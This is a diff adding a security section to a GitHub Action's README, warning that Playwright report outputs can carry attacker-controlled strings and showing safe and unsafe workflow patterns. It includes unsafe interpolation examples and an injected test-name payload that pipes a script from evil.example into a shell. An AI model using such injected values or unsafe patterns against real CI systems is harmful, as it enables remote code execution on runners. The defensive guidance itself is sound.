@@ -147,6 +147,60 @@ The raw data of the test report, as a JSON-encoded string. This is useful for cr
 You can get an idea of the data structure by checking out the
 [ReportSummary interface](https://github.com/daun/playwright-report-summary/blob/main/src/report.ts#L13).
 
+## Security: using outputs safely
+
+The `summary` and `report-data` outputs contain strings derived from the Playwright JSON report — including
+test titles, file paths, error messages and stack traces. When tests are produced from pull-request code
+(for example in a `pull_request_target` workflow, or via a `workflow_run` that downloads a report artifact
+from a fork PR), **those strings are attacker-controlled**.
+
+The action sanitizes its rendered comment so that untrusted content cannot inject active markdown.
+However, the `summary` and `report-data` outputs are deliberately raw so you can post-process them.
+GitHub Actions interpolates output values **literally, before the shell parses the command**, so passing
+them into a `run:` step can lead to script injection on the runner.
+
+### ✅ Safe patterns
+
+Pass outputs as **inputs to another action**. Action inputs are not shell-interpreted.
+
+```yaml
+- uses: daun/playwright-report-summary@v4
+  id: summary
+  with:
+    report-file: results.json
+    create-comment: false
+
+- uses: marocchino/sticky-pull-request-comment@v3
+  with:
+    message: ${{ steps.summary.outputs.summary }}   # safe: action input
+```
+
+If you need an output inside a `run:` step, pass it through an **environment variable** and quote the
+shell expansion. The value never touches the shell parser.
+
+```yaml
+- run: |
+    echo "$SUMMARY" >> notes.md
+  env:
+    SUMMARY: ${{ steps.summary.outputs.summary }}    # safe: env var, quoted
+```
+
+### ⚠️ Unsafe patterns
+
+Do **not** interpolate `summary` or `report-data` directly into a `run:` script:
+
+```yaml
+- run: echo "${{ steps.summary.outputs.summary }}"        # UNSAFE
+- run: curl -d "${{ steps.summary.outputs.report-data }}" \  # UNSAFE
+        https://example.com
+```
+
+A test named `` `; curl evil.example | sh; # `` would execute on your runner.
+
+See GitHub's guidance on
+[understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
+for more.
+
 ## License
 
 [MIT](./LICENSE)
